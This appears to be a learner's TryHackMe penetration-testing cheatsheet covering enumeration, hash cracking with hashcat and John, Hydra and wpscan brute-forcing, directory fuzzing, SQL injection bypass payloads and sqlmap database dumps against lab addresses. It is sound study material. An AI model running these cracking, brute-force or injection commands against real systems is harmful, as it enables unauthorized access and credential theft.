# THM Cheatsheet

## Table of contents

- [THM Cheatsheet](#thm-cheatsheet)
  - [Table of contents](#table-of-contents)
  - [Linux fundamentals](#linux-fundamentals)
    - [Basic shell](#basic-shell)
  - [Network Services](#network-services)
    - [SMB](#smb)
    - [tcpdump](#tcpdump)
    - [NFS](#nfs)
    - [SMTP](#smtp)
    - [MYSQL](#mysql)
  - [Hashing](#hashing)
    - [MD5 Hash](#md5-hash)
    - [Hash Identify](#hash-identify)
    - [Hash Identify Local](#hash-identify-local)
    - [Hash Crack](#hash-crack)
    - [Hashcat](#hashcat)
    - [RSA Calculator](#rsa-calculator)
    - [Password lists](#password-lists)
    - [Payloads](#payloads)
  - [John The Ripper](#john-the-ripper)
    - [/etc/shadow](#etcshadow)
    - [Single Crack Mode (word mangling)](#single-crack-mode-word-mangling)
    - [Zip Files](#zip-files)
    - [Rar Files](#rar-files)
    - [SSH Key](#ssh-key)
  - [GPG](#gpg)
  - [Hydra](#hydra)
  - [Burp Suite](#burp-suite)
  - [Feroxbuster](#feroxbuster)
  - [Gobuster](#gobuster)
  - [WFUZZ](#wfuzz)
  - [Nikto](#nikto)
  - [Wordpress scan](#wordpress-scan)
  - [Metasploit](#metasploit)
  - [Nmap](#nmap)
  - [rustscan](#rustscan)
  - [autorecon](#autorecon)
  - [Wireshark](#wireshark)
    - [Collection Methods](#collection-methods)
    - [Operators](#operators)
    - [Find](#find)
    - [Capture Filter](#capture-filter)
    - [Display Filters](#display-filters)
    - [ARP](#arp)
    - [ICMP](#icmp)
    - [HTPP](#htpp)
    - [Statistics](#statistics)
  - [SQL Injection](#sql-injection)
    - [sqlmap](#sqlmap)
  - [THM rooms](#thm-rooms)
  - [Help](#help)
    - [General](#general)
    - [Linux](#linux)
    - [Windows](#windows)
  - [Cheatsheets](#cheatsheets)

## Linux fundamentals

- export target=192.168.17.70
- ping $target

---

- whoami
- printenv
- env
- $PATH

- $(cat file.txt)

---

- find / -name filename 2>/dev/null
- locate

[THM find](https://tryhackme.com/room/thefindcommand)

---

- wc - word count
- wc -l - line count
- touch - create file
- file - determine file type

---

- su user2 - switch user to user2

---

- wget
- curl

---

- python3 -m http.server
- ps aux
- systemctl [option] [service]
- Ctrl + Z - puts into background
- fg - foregroung a process

---

- cat /etc/lsb-release
- uname -a

---

- strings -n 10 file - shows strings with more than 10 chars
- awk
- sed

---

- /etc
- /tmp
- /dev/shm

### Basic shell

```bash
#!/bin/bash
echo "Hello world!!!!"
```

[THM bash](https://tryhackme.com/room/bashscripting)

---

## Network Services

> [[Enumeration]](https://resources.infosecinstitute.com/topic/what-is-enumeration/)

- ping
- tracert
- whois domain
- Dig allows us to manually query recursive DNS servers of our choice for information about domains:
  - `dig <domain> @<dns-server-ip>`
  - `dig google.com @1.1.1.1`

### SMB

- nmap
  - `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP`
- enum4linux
  - `enum4linux -A targetIP`
- smbclient
  - `smbclient -L \\set.windcorp.thm -U user`
  - `smbclient //[IP]/[SHARE]`
- smmap
  - `smbmap -u "admin" -p "password" -H 10.10.10.10 -x "ipconfig"`
- impacket
  - `https://github.com/SecureAuthCorp/impacket`
- crackmapexec
  - `crackmapexec smb set.windcorp.thm -u user.txt -p /usr/share/wordlists/rockyou.txt`

### tcpdump

- tcpdump
  - `tcpdump ip proto \\icmp -i eth0`

### NFS

- `/usr/sbin/showmount -e targetIP`
- `sudo mount -t nfs targetIP:share /tmp/mount/ -nolock`

### SMTP

- metsaploit
  - `use auxiliary/scanner/smtp/smtp_version`
  - `use auxiliary/scanner/smtp/smtp_enum`

### MYSQL

- mysql cli
  - `mysql -h $target -u root -p`
- metasploit
  - `auxiliary/admin/mysql/mysql_sql`
  - `auxiliary/scanner/mysql/mysql_schemadump`
  - `auxiliary/scanner/mysql/mysql_hashdump`

---

- [THM introtonetworking](https://tryhackme.com/room/introtonetworking)
- [THM networkservices](https://tryhackme.com/room/networkservices)
- [THM networkservices2](https://tryhackme.com/room/networkservices2)

---

## Hashing

- **Plaintext** - Data before encryption or hashing, often text but not always as it could be a photograph or other file instead.
- **Encoding** - This is NOT a form of encryption, just a form of data representation like base64 or hexadecimal. Immediately reversible.
- **Hash** - A hash is the output of a hash function. Hashing can also be used as a verb, "to hash", meaning to produce the hash value of some data.
- **Brute** force - Attacking cryptography by trying every different password or every different key
- **Cryptanalysis** - Attacking cryptography by finding a weakness in the underlying maths

### MD5 Hash

```bash
┌──(kali㉿kali)-[~/thm/hashingcrypto]
└─$ echo -n "password" |md5sum
5f4dcc3b5aa765d61d8327deb882cf99
```

### Hash Identify

- <https://hashes.com/en/tools/hash_identifier>
- <https://www.tunnelsup.com/hash-analyzer/>

### Hash Identify Local

- haiti - <https://github.com/noraj/haiti/>

```bash
git clone https://github.com/noraj/haiti.git haiti
cd haiti
gem install bundler
bundler install
gem build haiti.gemspec
gem install haiti-x.x.x.gem
```

`haiti -i hash`

---

- hash-identifier - <https://github.com/blackploit/hash-identifier>
  - `python3 hash-id.py 48bb6e862e54f2a795ffc4e541caed4d`
- hashID - <https://github.com/psypanda/hashID>
- Name-That-Hash - <https://github.com/HashPals/Name-That-Hash>

### Hash Crack

- <https://crackstation.net/>
- <https://md5hashing.net/hash/>
- <https://www.onlinehashcrack.com/hash-identification.php>

### Hashcat

- Hashcat
  - <https://hashcat.net/wiki/doku.php?id=example_hashes>
  - md5 - 0 - `hashcat -D 1 -m 0 hash.txt /opt/rockyou.txt --force`
  - md4 - 900 - `hashcat -D 1 -m 900 hash.txt /opt/rockyou.txt --force`
  - ntlm - 1000 - `hashcat -D 1 -m 1000 hash.txt /opt/rockyou.txt --force`
  - 1400 - SHA2-256 - `hashcat -D 1 -m 1400 hash.txt /opt/rockyou.txt --force`
  - 1800 - sha512crypt $6$, SHA512 (Unix) 2 - `hashcat -D 1 -m 1800 hash.txt passwords --force`
  - 3200 -bcrypt $2*$, Blowfish (Unix) - `hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou/rockyou.txt --force`

### RSA Calculator

- <https://www.cs.drexel.edu/~jpopyack/IntroCS/HW/RSAWorksheet.html>

### Password lists

- SecLists - <https://github.com/danielmiessler/SecLists>
- wordlistctl - <https://github.com/BlackArch/wordlistctl>
- /usr/share/wordlists/fasttrack.txt
- /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10.txt
- /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
- /usr/share/wordlists/rockyou.txt

- cewl - <https://github.com/digininja/CeWL>
  - `cewl -d 2 -w $(pwd)/example.txt https://example.org`
- TTPassGen - <https://github.com/tp7309/TTPassGen>
  - `ttpassgen --rule '[?d]{4:4:*}' pin.txt` - 4 digits PIN
  - `ttpassgen --dictlist 'pin.txt,abc.txt' --rule '$0[-]{1}$1' combination.txt` - combine the PIN wordlist and the letter wordlist separated by a dash

### Payloads

payloadbox - <https://github.com/payloadbox>

---

- [THM hashingcrypto101](https://tryhackme.com/room/hashingcrypto101)
  - <https://pedroaovieira.gitbook.io/thm/crypto/hashing-crypto-101>
- [THM encryptioncrypto101](https://tryhackme.com/room/encryptioncrypto101)
  - <https://pedroaovieira.gitbook.io/thm/crypto/encryptioncrypto101>
- [THM crackthehash](https://tryhackme.com/room/crackthehash)
  - <https://pedroaovieira.gitbook.io/thm/crypto/crackthehash>
- [THM crackthehashlevel2](https://tryhackme.com/room/crackthehashlevel2)

---

## John The Ripper

- John - <https://github.com/openwall/john/blob/bleeding-jumbo/doc/INSTALL>
  - MD5 - `john hash_to_crack.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5`
  - SHA256 - `john hash3.txt --format=raw-sha256  --wordlist=/usr/share/wordlists/rockyou.txt`
  - SHA512 - `john hash4.txt --format=raw-sha512  --wordlist=/usr/share/wordlists/rockyou.txt`
  - Whirlpool - `john hash4.txt --format=whirlpool  --wordlist=/usr/share/wordlists/rockyou.txt`
  - NTLM - `john ntlm.txt --format=nt  --wordlist=/usr/share/wordlists/rockyou.txt`

### /etc/shadow

- Unshadowing
  - `unshadow [path to passwd] [path to shadow]`
  - `john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt`

### Single Crack Mode (word mangling)

- File sould be
  - word:hash
    - `john --single --format=raw-md5 hash7.txt`

### Zip Files

- Zip2John
  - `zip2john [options] [zip file] > [output file]`
  - `zip2john secure.zip > hash_zip.txt`
  - `john --wordlist=/usr/share/wordlists/rockyou.txt hash_zip.txt`

### Rar Files

- Rar2John
  - `rar2john [options] [rar file] > [output file]`
  - `rar2john secure.zip > hash_rar.txt`
  - `john --wordlist=/usr/share/wordlists/rockyou.txt hash_rar.txt`

### SSH Key

- SSH2John
  - `python /usr/share/john/ssh2john.pyssh2john.py id_rsa > id_rsa.hash`
  - `john id_rsa.hash --wordlist="check_password_lists"`

---

- [THM johntheripper](https://tryhackme.com/room/johntheripper0)

## GPG

```bash
gpg --import gpg.key
gpg message.gpg
cat message
```

---

## Hydra

---

- Hydra - <https://github.com/vanhauser-thc/thc-hydra>
  - `hydra -l user -P passlist.txt ftp://MACHINE_IP` - FTP
  - `hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh` - SSH
  - `hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V` - WEB
  - `hydra -l molly -P rock50.txt 10.10.63.174 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V` - WEB
  - `hydra -l bob -P password.txt -f 10.10.5.124 http-get /protected -V` - WEB

---

- [THM hydra](https://tryhackme.com/room/hydra)
- [THM toolsrus](https://tryhackme.com/room/toolsrus)

---

## Burp Suite

---

- [THM rpburpsuite](https://tryhackme.com/room/rpburpsuite)
- [THM burpsuitebasics](https://tryhackme.com/room/burpsuitebasics)
- [THM burpsuiterepeater](https://tryhackme.com/room/burpsuiterepeater)
- [THM burpsuiteintruder](https://tryhackme.com/room/burpsuiteintruder)
- [THM burpsuiteextender](https://tryhackme.com/room/burpsuiteextender)
- [THM burpsuiteom](https://tryhackme.com/room/burpsuiteom)

---

## Feroxbuster

- Feroxbuster
  - `feroxbuster -u http://$target -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt`
  - `feroxbuster -u http://$target -w /usr/share/wordlists/dirb/common.txt -x html php`
  - `feroxbuster -u http://$target -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html php`
  - `feroxbuster -u http://$target -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt bak old log html`

## Gobuster

- Gobuster
  - `gobuster -t 100 dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.13.49/island`

---

## WFUZZ

- WFUZZ
  - `wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt -hw 57 10.10.110.56:80/FUZZ/note.txt`
  - `wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hw 57 10.10.110.56:82/FUZZ.php`

---

## Nikto

- Nikto
  - `nikto -h http://10.10.5.124:1234/manager/html -id bob:bubbles -o nikto.txt`

## Wordpress scan

- wpscan
  - `wpscan --url http://blog.thm/ -e u` - enumerate users
  - `wpscan --url http://blog.thm/ -U user -P passwords.txt -t 35` - Brute force

---

## Metasploit

---

- [THM rpmetasploit](https://tryhackme.com/room/rpmetasploit)
- [THM metasploitintro](https://tryhackme.com/jr/metasploitintro)
- [THM metasploitexploitation](https://tryhackme.com/jr/metasploitexploitation)
- [THM meterpreter](https://tryhackme.com/jr/meterpreter)

---

## Nmap

---

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.13.49 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -v -sC -sV -oA file 10.10.13.49

nmap --script safe -445 10.10.10.100
```

---

- [THM furthernmap](https://tryhackme.com/room/furthernmap)
- [THM nmap01](https://tryhackme.com/jr/nmap01)
- [THM nmap02](https://tryhackme.com/jr/nmap02)
- [THM nmap03](https://tryhackme.com/jr/nmap03)
- [THM nmap04](https://tryhackme.com/jr/nmap04)

---

## rustscan

- rustscan
  - `rustscan -a $target --ulimit 5000 -- -sV -sC -A -oN nmap_output.txt`

## autorecon

- autorecon
  - `autorecon $target -vvv`

## Wireshark

> [THM](https://tryhackme.com/room/wireshark)

[Wireshark CheatSheet](images/Wireshark-Cheat-Sheet.jpg)

- Wireshark - <https://www.wireshark.org/>
  - Docs - <https://www.wireshark.org/docs/>

![Wireshark](images/wireshark001.png)

### Collection Methods

- Network Taps
- MAC Floods
- ARP Poisoning

### Operators

- and - operator: and / &&
- or - operator: or / ||
- equals - operator: eq / ==
- not equal - operator: ne / !=
- greater than - operator: gt /  >
- less than - operator: lt / <

### Find

![WiresharkFind](images/wireshark002.png)

### Capture Filter

Used to filter pacets that are being captured.

### Display Filters

> [DisplayFilters](https://wiki.wireshark.org/DisplayFilters)

- `ip.addr == <IP Address>`
- `ip.src == <SRC IP Address> and ip.dst == <DST IP Address>`
- `ip.src==192.168.0.0/16 and ip.dst==192.168.0.0/16`
- `tcp.port eq <Port #> or <Protocol Name>`
- `udp.port eq <Port #> or <Protocol Name>`
- `http.request`
- `wlan.addr == MAC-Address`

### ARP

- Request (1)
- Reply (2)

### ICMP

- request packet - type equals 8
- reply packet - type equals 0

### HTPP

- File > Export Objects > HTTP

### Statistics

- Summary about the capture file like: packet counts, captured time period, ...
- Protocol Hierarchy of the captured packets.
- Conversations e.g. traffic between specific Ethernet/IP/... addresses.
- Endpoints e.g. traffic to and from an Ethernet/IP/... address.

---

## SQL Injection

<https://owasp.org/www-community/attacks/SQL_Injection>

---

### sqlmap

- payloads
  - <https://github.com/payloadbox/sql-injection-payload-list#generic-sql-injection-payloads>

- Input Box
  - `' or 1=1--`
  - `1 or 1=1-- -`
  - `1' or '1'='1'-- -`
  - `http://MACHINE_IP:5000/sesqli3/login?profileID=-1' or 1=1-- -&password=a`

- SQLi manual
  - `10.10.191.90/sqli-labs/Less-1/index.php?id=1`
  - `10.10.191.90/sqli-labs/Less-1/index.php?id='`

- SQLI error based
- `10.10.191.90/sqli-labs/Less-1/index.php?id=1' AND 1=1 --+`

- DSSS - Damn Small SQLi Scanner - <https://github.com/stamparm/DSSS>
  - `git clone https://github.com/stamparm/DSSS.git`
  - `python3 ./dsss.py -u "10.10.191.90/sqli-labs/Less-1/index.php?id="`

- form
  - `sqlmap -u http://10.10.250.254 --forms`
  - `sqlmap -u http://10.10.250.254 --forms --dump`

- parameter
  - `sqlmap -u http://10.10.10.143/room.php?cod=5`
  - `sqlmap --url="http://bee-box/bWAPP/slqi_1.php?title=iron" --dbs`

- request
- `sqlmap -r santapanel.req --tamper=space2comment --dump-all -dbms sqlite`

- Other tools - Automatic - suIP.biz
  - <https://suip.biz/?act=sqlmap>

---

Payload Lists

1. <https://github.com/payloadbox/sql-injection-payload-list>
2. <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection>

Guides & Blogs

1. <https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet>
2. <https://www.sqlinjection.net/>
3. <http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet>
4. <https://github.com/trietptm/SQL-Injection-Payloads>
5. <https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet>
6. <https://resources.infosecinstitute.com/dumping-a-database-using-sql-injection/>

---

> [THM](https://tryhackme.com/room/sqlibasics)

---

## THM rooms

- <https://tryhackme.com/room/owasptop10>
- <https://tryhackme.com/room/adventofcyber2> !!! – recommended
- <https://tryhackme.com/room/ccpentesting> !!! – recommended
- <https://tryhackme.com/room/zthweb2>

CTFs that combine all the knowledge you got from other rooms:

- <https://tryhackme.com/room/hackernote>
- <https://tryhackme.com/room/picklerick> - <https://pedroaovieira.gitbook.io/thm/picklerick>
- <https://tryhackme.com/room/owaspjuiceshop>
- <https://tryhackme.com/room/brooklynninenine>
- <https://tryhackme.com/room/lianyu>
- <https://tryhackme.com/room/anthem>
- <https://tryhackme.com/room/agentsudoctf> - <https://pedroaovieira.gitbook.io/thm/agent-sudo>
- <https://tryhackme.com/room/easyctf>
- <https://tryhackme.com/room/attackerkb>
- <https://tryhackme.com/room/kenobi>
- <https://tryhackme.com/room/avengers>
- <https://tryhackme.com/room/toolsrus>
- <https://tryhackme.com/room/jurassicpark>
- <https://tryhackme.com/room/blue>

## Help

<https://inventory.raw.pm/overview.html>

### General

- <https://github.com/swisskyrepo/PayloadsAllTheThings> (A bunch of tools and payloads for every stage of pentesting)

### Linux

- <https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/> (a bit old but still worth looking at)
- <https://github.com/rebootuser/LinEnum> (One of the most popular priv esc scripts)
- <https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh> (Another popular script)
- <https://github.com/mzet-/linux-exploit-suggester> (A Script that's dedicated to searching for kernel exploits)
- <https://gtfobins.github.io> (I can not overstate the usefulness of this for priv esc, if a common binary has special permissions, you can use this site to see how to get root perms with it.)

### Windows

- <https://www.fuzzysecurity.com/tutorials/16.html>  (Dictates some very useful commands and methods to enumerate the host and gain intel)
- <https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp> (A bit old but still an incredibly useful script)
- <https://github.com/411Hall/JAWS> (A general enumeration script)

## Cheatsheets

- <https://uppusaikiran.github.io/hacking/Capture-the-Flag-CheatSheet/>
- <https://github.com/uppusaikiran/awesome-ctf-cheatsheet>
- <https://pedroaovieira.gitbook.io/thm/capture-the-flag/advent-of-cyber/pdf-materials>
- <https://github.com/ivan-sincek/penetration-testing-cheat-sheet>
- <https://github.com/welchbj/ctf/tree/master/docs>
